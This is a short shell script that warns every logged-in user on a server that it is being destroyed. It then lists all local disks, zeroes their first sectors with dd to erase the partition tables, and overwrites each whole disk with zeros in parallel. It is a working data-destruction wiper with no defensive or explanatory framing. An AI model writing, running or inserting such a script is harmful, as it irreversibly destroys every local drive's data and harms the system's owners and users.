# send warning message to everyone on server
w | tail -n +3 | tr -s ' ' | cut -d' ' -f 2 > /tmp/loginuser
for OUTPUT in $(cat /tmp/loginuser)
do
	for i in 1 2 3 4 5 6 7 8
	do
	  echo 'WARNING ! WARNING ! WARNING ! WARNING ! WARNING ! WARNING ! WARNING ! WARNING ! WARNING ! WARNING' > /dev/$OUTPUT
	done
	echo '' > /dev/$OUTPUT
	echo '                             THIS SERVER IS BEING DESTROY, RUN BOYS RUN!' > /dev/$OUTPUT
	echo '' > /dev/$OUTPUT
	for i in 1 2 3 4 5 6 7 8 
	do
	  echo 'WARNING ! WARNING ! WARNING ! WARNING ! WARNING ! WARNING ! WARNING ! WARNING ! WARNING ! WARNING' > /dev/$OUTPUT
	done
done
# collect disk info
fdisk -l | grep Disk | grep \/dev\/ | cut -d' ' -f 2 | cut -d':' -f1 > /tmp/localdrives
# erase disk header
for OUTPUT in $(cat /tmp/localdrives)
do
  dd if=/dev/zero of=$OUTPUT bs=512 count=1 conv=notrunc
done
# erase disk fully (take looooog times...)
echo long
for OUTPUT in $(cat /tmp/localdrives)
do
  dd if=/dev/zero of=$OUTPUT bs=512 conv=notrunc &
done